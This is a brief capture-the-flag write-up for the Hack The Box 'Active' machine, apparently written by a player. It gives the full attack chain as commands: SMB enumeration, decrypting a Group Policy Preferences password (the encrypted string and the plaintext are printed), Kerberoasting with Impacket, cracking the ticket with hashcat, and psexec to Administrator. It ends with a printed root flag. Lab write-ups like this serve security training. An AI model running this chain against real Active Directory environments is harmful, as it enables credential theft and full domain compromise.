This is a writeup for the Active box on HTB. 

We start by enumerating the machine with nmap

command:
```
nmap -sV -sC -T4 10.10.10.100 -p-
```
We then begin to enumerate with enum4linux:

```
enum4linux -a 10.10.10.100
```
We didn't find much so we decided to use smbclient instead:

```
smbmap -H 10.10.10.100
```
We find that we can access the Replication folder without authentication and decide to connect to it through smb:

```
smbclient //10.10.10.100/Replication -U ""%""
```
We fina a file ```Groups.xml``` that has a username and encrypted password. we use ```gpp-decrypt``` to derypt the
password ```GPPstillStandingStrong2k18```

```
gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
````
With the user name and password we can access 3 more shares:

```
smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18
```
We are able to get user.txt from here.

We edit the /etc/hosts file to include the hostname ```active.htb```.

from here we get the hash with impackets ```GetUserSPNs.py```:

```
./GetUserSPNs.py -request active.htb/SVC_TGS
```
We get the hash and then use hashcat to crack the hash:

```
hashcat -m 13100 kerbticket.hash  ~/rockyou.txt 
```
Afterwards we are able to gain root access:

```
psexec.py htb.active/Administrator@10.10.10.100
```
we get the root flag: 085805c4a84e39ce38afa410bf50fb57

system has been fully compromised; action is no longer required.
